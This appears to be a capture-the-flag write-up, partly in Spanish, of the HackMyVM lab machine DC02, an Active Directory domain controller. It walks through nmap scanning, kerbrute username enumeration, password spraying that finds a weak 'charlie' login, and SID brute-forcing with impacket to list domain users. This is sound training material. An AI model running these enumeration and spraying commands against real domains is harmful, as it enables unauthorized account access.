# üñ•Ô∏è Writeup - DC02 

**Platform:** HackMyVM  
**Difficulty:** Medium  
**Operating System:** Windows  

# INSTALLATION

We download the `zip` containing the `.ova` of the DC02 machine, extract it, and import it into VirtualBox.

We configure the network interface of the DC02 machine and run it alongside the attacker machine.

# HOST DISCOVERY

At this point, we still don‚Äôt know which `IP` address is assigned to DC02, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```
Info:
```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:a0:a6:e6      1      60  PCS Systemtechnik GmbH      
 10.0.4.18       08:00:27:8e:e4:bf      1      60  PCS Systemtechnik GmbH
 ```

 We identify with high confidence that the victim‚Äôs IP is `10.0.4.18`.

 # PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.18
``` 

```bash
nmap -n -Pn -sCV -p22,80,3306 --min-rate 5000 10.0.4.18
```
Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 18:22 CEST
Nmap scan report for 10.0.4.18
Host is up (0.00017s latency).
Not shown: 65518 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-08 01:22:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49719/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:8E:E4:BF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.24 seconds
```

It is clear that we are dealing with an `Active Directory` environment, and the domain is `SOUPEDECODE.LOCAL`.

We then add the domain to the `/etc/hosts` file.

Info:
```
127.0.0.1	localhost
127.0.1.1	kali
10.0.4.18       SOUPEDECODE.LOCAL
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

# SMB
Now we proceed with SMB enumeration to look for information about available shares and users:

```bash
smbclient -L SOUPEDECODE.LOCAL -N
```

Info:
```
session setup failed: NT_STATUS_ACCESS_DENIED
```

No podemos enumerar shares a traves de una NULL session.
Vamos a provar si esta habilitado el usuario guest.

```bash
netexec smb SOUPEDECODE.LOCAL -u 'guest' -p ''
``` 
Info:
```
SMB         10.0.4.18       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```

Vemos que la cuenta guest esta deshabilitada, asi que no tenemos forma de enumerar los recursos de SMB.

Hay que encontrar otra via para enumerar usuarios.

# KERBRUTE

Vamos a utilizar kerbrute para identificar usuarios del sistema con una wordlist de usernames.

```bash
./kerbrute_linux_amd64 userenum -d SOUPEDECODE.LOCAL  --dc 10.0.4.18 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Info:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/07/25 - Ronnie Flathers @ropnop

2025/09/07 18:43:51 >  Using KDC(s):
2025/09/07 18:43:51 >  	10.0.4.18:88

2025/09/07 18:43:51 >  [+] VALID USERNAME:	 admin@SOUPEDECODE.LOCAL
2025/09/07 18:43:51 >  [+] VALID USERNAME:	 charlie@SOUPEDECODE.LOCAL
2025/09/07 18:43:51 >  [+] VALID USERNAME:	 Charlie@SOUPEDECODE.LOCAL
2025/09/07 18:43:51 >  [+] VALID USERNAME:	 administrator@SOUPEDECODE.LOCAL
2025/09/07 18:43:51 >  [+] VALID USERNAME:	 Admin@SOUPEDECODE.LOCAL
2025/09/07 18:43:52 >  [+] VALID USERNAME:	 Administrator@SOUPEDECODE.LOCAL
2025/09/07 18:43:52 >  [+] VALID USERNAME:	 CHARLIE@SOUPEDECODE.LOCAL
2025/09/07 18:43:56 >  [+] VALID USERNAME:	 ADMIN@SOUPEDECODE.LOCAL
2025/09/07 18:44:46 >  [+] VALID USERNAME:	 wreed11@SOUPEDECODE.LOCAL
```

Encontramos dos usuarios que no son por defecto: charlie y wreed11.

Los ponemos en un archivo .txt para poder hacer password spraying con los usuarios

# PASSWORD SPRAYING

```bash
crackmapexec smb 10.0.4.18 -u users.txt -p users.txt --continue-on-success --no-bruteforce
```

Info:
```
SMB         10.0.4.18       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.4.18       445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         10.0.4.18       445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE
```

Hemos obtenido la contrase√±a para el usuario charlie : charlie .

# SMB with user charlie

```bash
netexec smb 10.0.4.18 -u 'charlie' -p 'charlie'  --shares
```
Info:
```
SMB         10.0.4.18       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.0.4.18       445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         10.0.4.18       445    DC01             [*] Enumerated shares
SMB         10.0.4.18       445    DC01             Share           Permissions     Remark
SMB         10.0.4.18       445    DC01             -----           -----------     ------
SMB         10.0.4.18       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.4.18       445    DC01             C$                              Default share
SMB         10.0.4.18       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.4.18       445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.4.18       445    DC01             SYSVOL          READ            Logon server share
```

Nada interesante en los recursos de SMB

# Impacket lookupsid
Ahora que contamos con un usuario y contrase√±a validos vamos a sacar todos los usuarios del sistema utilizando la herramienta de impacket lookupsid.py.

```bash
impacket-lookupsid SOUPEDECODE.LOCAL/charlie@10.0.4.18 > user.txt
```

Info:
```
[*] Brute forcing SIDs at 10.0.4.18
[*] StringBinding ncacn_np:10.0.4.18[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
525: SOUPEDECODE\Protected Users (SidTypeGroup)
526: SOUPEDECODE\Key Admins (SidTypeGroup)
527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
1000: SOUPEDECODE\DC01$ (SidTypeUser)
1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
1103: SOUPEDECODE\bmark0 (SidTypeUser)
1104: SOUPEDECODE\otara1 (SidTypeUser)
1105: SOUPEDECODE\kleo2 (SidTypeUser)
1106: SOUPEDECODE\eyara3 (SidTypeUser)
1107: SOUPEDECODE\pquinn4 (SidTypeUser)
1108: SOUPEDECODE\jharper5 (SidTypeUser)
1109: SOUPEDECODE\bxenia6 (SidTypeUser)
1110: SOUPEDECODE\gmona7 (SidTypeUser)
1111: SOUPEDECODE\oaaron8 (SidTypeUser)
1112: SOUPEDECODE\pleo9 (SidTypeUser)
1113: SOUPEDECODE\evictor10 (SidTypeUser)
1114: SOUPEDECODE\wreed11 (SidTypeUser)
1115: SOUPEDECODE\bgavin12 (SidTypeUser)
1116: SOUPEDECODE\ndelia13 (SidTypeUser)
1117: SOUPEDECODE\akevin14 (SidTypeUser)
1118: SOUPEDECODE\kxenia15 (SidTypeUser)
1119: SOUPEDECODE\ycody16 (SidTypeUser)
1120: SOUPEDECODE\qnora17 (SidTypeUser)
1121: SOUPEDECODE\dyvonne18 (SidTypeUser)
1122: SOUPEDECODE\qxenia19 (SidTypeUser)
1123: SOUPEDECODE\rreed20 (SidTypeUser)
1124: SOUPEDECODE\icody21 (SidTypeUser)
1125: SOUPEDECODE\ftom22 (SidTypeUser)
1126: SOUPEDECODE\ijake23 (SidTypeUser)
1127: SOUPEDECODE\rpenny24 (SidTypeUser)
1128: SOUPEDECODE\jiris25 (SidTypeUser)
1129: SOUPEDECODE\colivia26 (SidTypeUser)
1130: SOUPEDECODE\pyvonne27 (SidTypeUser)
1131: SOUPEDECODE\zfrank28 (SidTypeUser)
1132: SOUPEDECODE\ybob317 (SidTypeUser)
1133: SOUPEDECODE\file_svc (SidTypeUser)
1134: SOUPEDECODE\charlie (SidTypeUser)
1135: SOUPEDECODE\qethan32 (SidTypeUser)
..................<REST_OF_USERS>.........................................
```

The list must be processed to extract only the usernames.

```bash
grep '(SidTypeUser)' user.txt | awk -F'\\\\' '{print $2}' | cut -d' ' -f1 > users.txt
```
Info:
```
Administrator
Guest
krbtgt
DC01$
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
bxenia6
gmona7
oaaron8
pleo9
evictor10
wreed11
bgavin12
ndelia13
akevin14
kxenia15
ycody16
qnora17
dyvonne18
qxenia19
rreed20
icody21
ftom22
ijake23
rpenny24
jiris25
colivia26
pyvonne27
zfrank28
ybob317
file_svc
charlie
qethan32
..................<REST_OF_USERS>.........................................
```